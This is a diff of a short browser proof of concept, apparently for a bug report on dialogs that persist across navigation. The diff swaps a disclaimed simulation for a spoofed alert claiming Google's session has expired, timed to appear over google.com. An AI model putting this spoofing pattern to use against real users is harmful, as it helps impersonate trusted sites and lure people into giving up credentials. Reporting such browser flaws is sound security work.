@@ -1,38 +1,16 @@
-<!doctype html>
-<html>
-<body>
-<h2>UI Persistence – Security Impact Simulation (Localhost)</h2>
-<p>This PoC is intentionally non-exploitative.</p>
-
 <script>
 function poc() {
-  const origin = location.origin;
-  const time = new Date().toISOString();
-
-  // Trigger top-level navigation
-  window.open('https://google.com', '_top');
-
-  // Show dialog after navigation
+  // 1. Trigger dialog dari origin A
   setTimeout(() => {
-    alert(
-      'UI Persistence Demonstration\n\n' +
-      'Dialog Origin: ' + origin + '\n' +
-      'Created at: ' + time + '\n\n' +
+    alert("google.com\nSession expired.\nPlease re-authenticate.");
+  }, 100);
 
-      '[SIMULATION ONLY]\n' +
-      '- No credential capture\n' +
-      '- No impersonation\n' +
-      '- No data exfiltration\n' +
-      '- No origin policy bypass\n\n' +
-
-      'This dialog demonstrates that UI created by a previous origin\n' +
-      'may remain visible after navigation, which could theoretically\n' +
-      'enable the above impacts if interactive elements were present.'
-    );
+  // 2. Segera navigasi ke origin B
+  setTimeout(() => {
+    location.href = "https://www.google.com";
   }, 150);
 }
 
-setTimeout(poc, 1500);
+// 3. Jalankan setelah page stabil
+setTimeout(poc, 2000);
 </script>
-</body>
-</html>
